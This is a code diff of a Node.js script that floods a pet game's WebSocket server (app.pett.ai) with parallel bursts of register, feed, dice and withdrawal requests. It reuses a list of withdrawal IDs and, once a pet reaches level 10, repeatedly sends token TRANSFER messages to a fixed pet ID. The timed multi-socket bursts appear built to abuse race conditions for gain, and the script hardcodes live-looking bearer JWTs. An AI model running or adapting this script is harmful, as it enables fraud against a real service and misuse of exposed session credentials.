@@ -5,33 +5,23 @@ const endpoint = "wss://petbot-monorepo-websocket-333713154917.europe-west1.run.
 const origin = "https://app.pett.ai";
 const pettName = `ao_cb_${Math.floor(Math.random() * 999)}_rs_${Math.floor(Math.random() * 999)}`;
 
-const jwt = "Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IlU3bU9NMzBNZGJRY3RQMmdoWE4wU0dhTDFIWjNSUWVoZWxkZUNHNF9OaWsifQ.eyJzaWQiOiJjbWZqdGhvczIwMDAzbDUwYm53OWxmdnMyIiwiaXNzIjoicHJpdnkuaW8iLCJpYXQiOjE3NTc4NjE3MzYsImF1ZCI6ImNtN2dldjVzNjAwdmJrMmxzajZlMWU5ZzciLCJzdWIiOiJkaWQ6cHJpdnk6Y21lMTF6bG16MDBrdmw1MGJjeXM2b3psaiIsImV4cCI6MTc1Nzg2NTMzNn0.XTQEqN2wbY82KcXqxKLbkyeBVmcqMkMb8GdZSegFGBbupsoanNQGW1NDssTZekLW8O-tBpnm2-_N3jaoRGlW_g"
+const jwt = "Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IlU3bU9NMzBNZGJRY3RQMmdoWE4wU0dhTDFIWjNSUWVoZWxkZUNHNF9OaWsifQ.eyJzaWQiOiJjbWVxY3d2bmYwMDNjbDUwY3E3MXo1dnNzIiwiaXNzIjoicHJpdnkuaW8iLCJpYXQiOjE3NTc4MDMyOTcsImF1ZCI6ImNtN2dldjVzNjAwdmJrMmxzajZlMWU5ZzciLCJzdWIiOiJkaWQ6cHJpdnk6Y21lcWN3dm92MDAzZWw1MGM5bnV5eDUwayIsImV4cCI6MTc1NzgwNjg5N30.OxRAFLQN-abAgmgB9ewZ22iLe2ho4qBHu3KuSd_gi7hzixguAWiHMB9JIFnN_aYrwgi8DnLIWT-HqiX6Q5IKmw"
 
-const type = "jump"; 
-
-//  Change this to food for level up
-// Run it until level says 10
+const type = "register"; // change to "food" for leveling, etc.
 
 // withdrawal IDs
 const withdrawalIds = [
-// "5b6f3c83-a6d8-4be3-a7bc-4cf08435e6d6",
-"6df471a2-f5ef-4beb-870e-ef0951f360f9"
+  "5b6f3c83-a6d8-4be3-a7bc-4cf08435e6d6",
+  "7a9f5230-4264-4971-951c-90cc40a0efe2",
+  "6d6a442e-1c2e-4f3f-9ac4-f7e6b7dda3d4",
+  "af723d9a-bd6b-4966-8f7d-1b8795dce152",
+  "3ff4be62-4b4e-4255-b1ed-aae2d2dd6c6b",
+  "e4604cf3-c4e3-4da8-9c1a-a3a0c0919e70",
+  "366b06a4-1b00-4f79-b760-ec2820f9e721",
+  "e78e5448-9e0c-4cf1-9b3d-f835d617bc5e",
+  "92ad3bb3-ded7-4cc9-a41d-98114ef0cfdd",
 ];
-
-
 const withdrawalId = withdrawalIds[Math.floor(Math.random() * withdrawalIds.length)];
-// const withdrawalId = "3d3e4999-62b6-4505-b0fa-6a267a2cbf1f"
-
-// "5b6f3c83-a6d8-4be3-a7bc-4cf08435e6d6"
-// "7a9f5230-4264-4971-951c-90cc40a0efe2"
-// "6d6a442e-1c2e-4f3f-9ac4-f7e6b7dda3d4"
-// "af723d9a-bd6b-4966-8f7d-1b8795dce152"
-// "3ff4be62-4b4e-4255-b1ed-aae2d2dd6c6b"
-// "e4604cf3-c4e3-4da8-9c1a-a3a0c0919e70"
-// "366b06a4-1b00-4f79-b760-ec2820f9e721"
-// "e78e5448-9e0c-4cf1-9b3d-f835d617bc5e"
-// "92ad3bb3-ded7-4cc9-a41d-98114ef0cfdd"
-
 
 // ---- HELPERS ----
 const makeRegisterString = () => JSON.stringify({
@@ -53,7 +43,6 @@ const makeJumpString = () => JSON.stringify({
 });
 
 const makeWithdrawString = () => JSON.stringify({
-  // type: "WITHDRAWAL_QUEUE",
   type: "WITHDRAWAL_USE",
   data: { params: { withdrawalId } },
   nonce: uuidv4(),
@@ -99,6 +88,17 @@ const makeDiceString = (betAmount, mode) => {
   });
 };
 
+const makeAtmString = () => JSON.stringify({
+    type: "TRANSFER",
+    data: {
+        params: {
+            petTo: "23d430f9-e9f8-4788-a1a3-97c9476dad28",
+            amount: 0
+        }
+    },
+    nonce: uuidv4()
+});
+
 // ---- CONFIG PER TYPE ----
 const CONFIGS = {
   dice: {
@@ -125,7 +125,7 @@ const CONFIGS = {
     TOTAL_SOCKETS: 10,
     REQUESTS_PER_SOCKET: 1,
     BLAST_DURATION_MS: 40,
-    REST_BETWEEN_WAVES_MS: 500,
+    REST_BETWEEN_WAVES_MS: 1000,
     handler: (ws) => {
       ws.send(makeAuthString());
       ws.send(makeWithdrawString());
@@ -152,7 +152,7 @@ const CONFIGS = {
     },
   },
   register: {
-    TOTAL_SOCKETS: 550,
+    TOTAL_SOCKETS: 500,
     REQUESTS_PER_SOCKET: 10,
     BLAST_DURATION_MS: 40,
     REST_BETWEEN_WAVES_MS: 30000,
@@ -172,8 +172,14 @@ let totalReceived = 0;
 let waveCounter = 0;
 let blasting = false;
 
+let currentLevel = 0;
+let tokenBalance = 0;
+let atmMode = false; // 🆕 flag: switch to ATM once level >= 10
+
 // ---- send gradually ----
 function blastWave() {
+  if (atmMode) return; // 🚨 Stop normal feed if ATM mode started
+
   const live = sockets.filter((s) => s.ws.readyState === WebSocket.OPEN);
   if (!live.length) {
     console.log("⚠ No live sockets remain, stopping");
@@ -206,6 +212,18 @@ function blastWave() {
   }, BLAST_DURATION_MS + 20);
 }
 
+// ---- ATM loop ----
+function startAtmLoop(ws) {
+  if (atmMode) {
+    setInterval(() => {
+      if (ws.readyState === WebSocket.OPEN) {
+        ws.send(makeAtmString());
+        console.log("🏧 Sent ATM request");
+      }
+    }, 2000); // every 2s
+  }
+}
+
 // ---- sockets ----
 function connectSocket(socketId) {
   const headers = {
@@ -219,7 +237,7 @@ function connectSocket(socketId) {
     sockets.push({ ws, id: socketId });
     console.log(`✅ Socket ${socketId} connected (${sockets.length}/${TOTAL_SOCKETS})`);
 
-    if (sockets.length === TOTAL_SOCKETS && !blasting) {
+    if (sockets.length === TOTAL_SOCKETS && !blasting && !atmMode) {
       console.log("🚀 All sockets ready — starting waves");
       blastWave();
     }
@@ -228,6 +246,27 @@ function connectSocket(socketId) {
   ws.on("message", (m) => {
     const msg = JSON.parse(m.toString());
     console.log(msg);
+
+    // 🆙 Track level
+    if (msg?.pet?.PetStats?.level) {
+      currentLevel = Number(msg.pet.PetStats.level);
+      console.log(`📊 Current level: ${currentLevel}`);
+
+      if (currentLevel >= 10 && !atmMode) {
+        console.log("🏁 Level >= 10 — switching to ATM mode");
+        atmMode = true;
+        blastWave = () => {}; // disable feed
+        startAtmLoop(ws); // start ATM loop
+      }
+    }
+
+    // 💰 Track token balance
+    if (msg?.pet?.PetTokens?.tokens) {
+      tokenBalance = Number(msg.pet.PetTokens.tokens);
+      const tokenBalanceDisplay = Number(tokenBalance / 1000000000000000000)
+      console.log(`💰 Token balance: ${tokenBalanceDisplay}`);
+      console.log(`---${Number(Math.floor(tokenBalance - Number(tokenBalance * 1 / 100))/1000000000000000000)}`)
+    }
     if (msg.error?.toLowerCase() === "user already created") {
       totalReceived += 1;
     }
